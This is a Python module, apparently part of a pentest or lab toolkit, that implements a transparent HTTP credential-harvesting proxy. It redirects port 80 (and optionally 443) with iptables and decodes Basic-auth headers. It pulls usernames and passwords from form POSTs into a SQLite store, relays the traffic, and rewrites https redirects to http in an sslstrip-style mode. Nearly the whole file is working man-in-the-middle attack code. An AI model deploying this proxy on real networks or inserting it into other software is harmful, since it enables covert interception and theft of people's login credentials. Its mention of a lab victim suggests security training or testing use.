"""Transparent HTTP credential-capture proxy + https-split mode.

Under ``--apply`` iptables REDIRECTs TCP/80 (and TCP/443 in https-split mode)
on the interface to a local proxy that parses HTTP, harvests form POSTs and
Basic-authentication creds into the SQLite store, relays the request to the
real destination, and optionally writes the exchange to a pcap.

Full TLS decryption is out of scope; https-split mode only performs
sslstrip-lite (https -> http rewrite on 3xx Location headers) for plaintext
HTTP flows and records that TLS sessions were observed but not decrypted.
"""

from __future__ import annotations

import base64
import http.client
import socketserver
import threading
import urllib.parse
from typing import Dict, List, Optional, Tuple

from .netplan import OpPlan, iptables_redirect_argv
from .ssl import is_tls_client_hello, rewrite_https_location

MAX_HEADER_BYTES = 65536
_CAPTURE_KEYS = ("user", "username", "userid", "login", "email", "name", "pass", "password", "passwd", "pwd", "secret", "token")
_HOP_BY_HOP = {"connection", "proxy-connection", "proxy-authorization", "keep-alive", "te", "trailer", "transfer-encoding", "upgrade"}


class CredHarvestProxy(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, server_address, handler):
        super().__init__(server_address, handler)
        self.store = None
        self.writer = None
        self.log = None
        self.pcap = None
        self.sslstrip = False
        self.captures = 0
        self.requests = 0


class ProxyHandler(socketserver.StreamRequestHandler):
    timeout = 60

    def handle(self) -> None:  # noqa: C901 - intentionally linear relay
        server: CredHarvestProxy = self.server
        raw_head = self._read_head()
        if not raw_head:
            return
        server.requests += 1

        if is_tls_client_hello(raw_head):
            server.log.warning(
                "TLS session from %s: not decryptable (https-split needs a "
                "mitm CA on the lab victim); recording as tls_blocked",
                self.client_address[0],
            )
            return

        try:
            head_text = raw_head.decode("latin-1")
            request_line, header_lines = head_text.split("\r\n", 1)
            parts = request_line.split()
            if len(parts) != 3:
                return
            method, target, _version = parts
            headers = _parse_headers(header_lines)
            body = b""
            content_length = _clen(headers)
            if content_length > 0:
                body = self._read_exact(content_length)
        except (ValueError, UnicodeDecodeError, ConnectionError):
            return

        host = headers.get("host")
        if not host:
            self._reply_simple(400, b"Bad Request: missing Host")
            return

        forward_path = target
        netloc = host
        if target.startswith("http://") or target.startswith("https://"):
            parsed = urllib.parse.urlsplit(target)
            netloc = parsed.netloc
            forward_path = urllib.parse.urlunsplit(
                ("", "", parsed.path or "/", parsed.query, "")
            )

        remote = f"{self.client_address[0]}:{self.client_address[1]}"
        captures = extract_credentials(method, netloc + forward_path, headers, body)
        for cap in captures:
            cap.setdefault("remote", remote)
            self._record_capture("http", cap)

        if method == "CONNECT":
            self._reply_simple(405, b"CONNECT not supported (TLS MITM out of scope)")
            return

        self._relay(method, forward_path, netloc, headers, body, raw_head + body)
        server.writer.emit(
            "http",
            "http_request",
            "info",
            {"method": method, "url": netloc + forward_path, "remote": remote},
        )

    def _read_head(self) -> bytes:
        data = bytearray()
        while len(data) < MAX_HEADER_BYTES:
            chunk = self.request.recv(4096)
            if not chunk:
                break
            data += chunk
            if b"\r\n\r\n" in data:
                break
            if len(chunk) < 4096:
                break
        head, sep, tail = bytes(data).partition(b"\r\n\r\n")
        if not sep:
            return head if head else b""
        self._prepend_tail(tail)
        return head + b"\r\n\r\n"

    def _prepend_tail(self, tail: bytes) -> None:
        self._tail = tail

    def _read_exact(self, n: int) -> bytes:
        buf = bytearray()
        tail = getattr(self, "_tail", b"")
        if tail:
            buf += tail
            self._tail = b""
        while len(buf) < n:
            chunk = self.request.recv(min(65536, n - len(buf)))
            if not chunk:
                break
            buf += chunk
        return bytes(buf[:n])

    def _relay(
        self,
        method: str,
        path: str,
        netloc: str,
        headers: Dict[str, str],
        body: bytes,
        raw_request: bytes,
    ) -> None:
        host = netloc
        if ":" in netloc[1:]:
            host, _, _port = netloc.rpartition(":")
        try:
            conn = http.client.HTTPConnection(host, 80, timeout=20)
            out_headers = {k: v for k, v in headers.items() if k not in _HOP_BY_HOP}
            conn.request(method, path or "/", body=body or None, headers=out_headers)
            resp = conn.getresponse()
            resp_body = resp.read()
            resp_headers = [(k, v) for k, v in resp.getheaders() if k.lower() not in _HOP_BY_HOP]
            if self.server.sslstrip and resp.status in (301, 302, 303, 307, 308):
                resp_headers = [
                    (k, rewrite_https_location(v.encode("latin-1")).decode("latin-1") if k.lower() == "location" else v)
                    for k, v in resp_headers
                ]
            status_line = f"HTTP/1.1 {resp.status} {_reason(resp)}"
            header_block = "".join(f"{k}: {v}\r\n" for k, v in resp_headers if k.lower() != "content-length")
            raw_response = (
                status_line + "\r\n" + header_block
                + f"Content-Length: {len(resp_body)}\r\n"
                + "Connection: close\r\n\r\n"
            ).encode("latin-1") + resp_body
            conn.close()
        except OSError as exc:
            self.server.log.warning("relay to %s failed: %s", netloc, exc)
            raw_response = (
                b"HTTP/1.1 502 Bad Gateway\r\nConnection: close\r\n"
                b"Content-Length: 0\r\n\r\n"
            )

        self._write_all(raw_response)
        if self.server.pcap:
            self.server.pcap.write(raw_request)
            self.server.pcap.write(raw_response)

    def _record_capture(self, module: str, cap: Dict[str, object]) -> None:
        self.server.captures += 1
        payload = {
            "kind": cap.get("kind"),
            "username": cap.get("username"),
            "password": cap.get("password"),
            "url": cap.get("url"),
        }
        self.server.store.record_capture(
            kind=str(cap.get("kind")),
            username=str(cap.get("username")) if cap.get("username") else None,
            password=str(cap.get("password")) if cap.get("password") else None,
            url=cap.get("url") or "",
            remote=cap.get("remote") or "",
            payload=payload,
            module=module,
        )
        self.server.writer.emit(module, "credential_capture", "warn", payload)
        self.server.log.warning(
            "[CAPTURE] %s %s @ %s", cap.get("kind"), cap.get("url"), cap.get("remote")
        )

    def _reply_simple(self, status: int, body: bytes) -> None:
        self._write_all(
            (f"HTTP/1.1 {status}\r\nConnection: close\r\nContent-Length: {len(body)}\r\n\r\n").encode("latin-1")
            + body
        )

    def _write_all(self, data: bytes) -> None:
        try:
            self.request.sendall(data)
        except OSError:
            pass


def _reason(resp: http.client.HTTPResponse) -> str:
    from http.client import responses

    return responses.get(resp.status, "Status")


def _parse_headers(header_lines: str) -> Dict[str, str]:
    headers: Dict[str, str] = {}
    for line in header_lines.split("\r\n"):
        if not line or line.startswith(" ") or ":" not in line:
            continue
        k, _, v = line.partition(":")
        headers[k.strip().lower()] = v.strip()
    return headers


def _clen(headers: Dict[str, str]) -> int:
    try:
        return int(headers.get("content-length", "0"))
    except ValueError:
        return 0


def extract_credentials(
    method: str, url: str, headers: Dict[str, str], body: bytes
) -> List[Dict[str, object]]:
    """Harvest form POST credentials and Basic auth from a request."""
    found: List[Dict[str, object]] = []

    auth = headers.get("authorization", "")
    if auth.lower().startswith("basic "):
        try:
            decoded = base64.b64decode(auth[6:].strip()).decode("utf-8", "replace")
            user, _, pw = decoded.partition(":")
            if user or pw:
                found.append(
                    {
                        "kind": "basic_auth",
                        "username": user,
                        "password": pw,
                        "url": url,
                    }
                )
        except (base64.binascii.Error, ValueError):
            pass

    if method == "POST" and "urlencoded" in headers.get("content-type", "").lower():
        params = urllib.parse.parse_qsl(
            body.decode("utf-8", "replace"), keep_blank_values=True
        )
        cred = _pick_form_credentials(params)
        if cred:
            found.append(
                {"kind": "form_post", "username": cred[0], "password": cred[1], "url": url}
            )
    return found


def _pick_form_credentials(params: List[Tuple[str, str]]) -> Optional[Tuple[str, str]]:
    as_dict = {k.lower(): v for k, v in params}
    user_key = next((k for k in as_dict if k in _CAPTURE_KEYS and k not in ("pass", "password", "passwd", "pwd", "secret", "token")), None)
    pass_key = next((k for k in as_dict if k in ("password", "pass", "passwd", "pwd", "secret")), None)
    if user_key is not None and pass_key is not None:
        return (as_dict[user_key], as_dict[pass_key])
    if pass_key is not None and len(params) == 1:
        token = as_dict[pass_key]
        return ("token", token)
    return None


def run_proxy(
    host: str,
    port: int,
    store,
    writer,
    log,
    pcap=None,
    sslstrip: bool = False,
    stop: Optional[threading.Event] = None,
) -> CredHarvestProxy:
    stop = stop or threading.Event()
    server = CredHarvestProxy((host, port), ProxyHandler)
    server.store = store
    server.writer = writer
    server.log = log
    server.pcap = pcap
    server.sslstrip = sslstrip
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    log.info("credential-capture proxy listening on %s:%d (sslstrip=%s)", host, port, sslstrip)
    return server


def plan_http(iface: str, proxy_port: int, sslstrip: bool = False) -> OpPlan:
    plan = OpPlan(
        f"HTTP credential capture on {iface} (proxy :{proxy_port})"
        + (" [https-split: 443 also redirected]" if sslstrip else "")
    )
    plan.add_message(
        f"start credential-capture proxy on 0.0.0.0:{proxy_port}; "
        "POST form + Basic auth credentials logged to SQLite/JSONL"
    )
    plan.add_iptables(
        f"REDIRECT TCP/80 on {iface} to proxy :{proxy_port}",
        iptables_redirect_argv(iface, "tcp", 80, proxy_port, "http"),
    )
    if sslstrip:
        plan.add_iptables(
            f"REDIRECT TCP/443 on {iface} to proxy :{proxy_port}",
            iptables_redirect_argv(iface, "tcp", 443, proxy_port, "https-split"),
        )
        plan.add_message(
            "https-split limits: TLS sessions are logged as tls_blocked "
            "(full decryption requires a MITM CA configured on the lab victim)"
        )
    return plan


def stop_proxy(server: CredHarvestProxy) -> None:
    try:
        server.shutdown()
    except Exception:
        pass
    try:
        server.server_close()
    except Exception:
        pass